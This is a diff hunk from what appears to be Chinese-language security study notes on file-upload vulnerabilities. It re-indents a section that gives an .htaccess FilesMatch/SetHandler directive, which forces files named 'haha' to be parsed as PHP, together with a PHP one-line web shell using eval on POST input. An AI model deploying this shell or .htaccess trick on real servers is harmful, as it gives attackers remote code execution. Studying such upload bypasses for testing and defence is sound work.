@@ -246,17 +246,17 @@
   这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞（想方设法把想上传的文件的扩展名加入到白名单列表里面去）
 
   3. htaccess文件攻击<br>
-  * 无论是黑名单还是白名单，直接点就是直接攻击.htaccess文件
-    + 提供一个代码:<br>
-    
-    ```
-    <FilesMatch "haha">
-    SetHandler application/x-httpd-php
-    </FileMatch>
-    ```
-    + 然后准备一个名叫haha的一句话木马，内容如下:<br>
-    "haha" <?php @eval($_POST['1']);?><br>
-    只要一句话木马的名字包含haha就能够当作php文件解析了，一句话木马的内容一定要包含.htaccess里面定义的"haha"
+    * 无论是黑名单还是白名单，直接点就是直接攻击.htaccess文件
+      + 提供一个代码:<br>
+      
+      ```
+      <FilesMatch "haha">
+      SetHandler application/x-httpd-php
+      </FileMatch>
+      ```
+      + 然后准备一个名叫haha的一句话木马，内容如下:<br>
+      "haha" <?php @eval($_POST['1']);?><br>
+      只要一句话木马的名字包含haha就能够当作php文件解析了，一句话木马的内容一定要包含.htaccess里面定义的"haha"
 
 
 
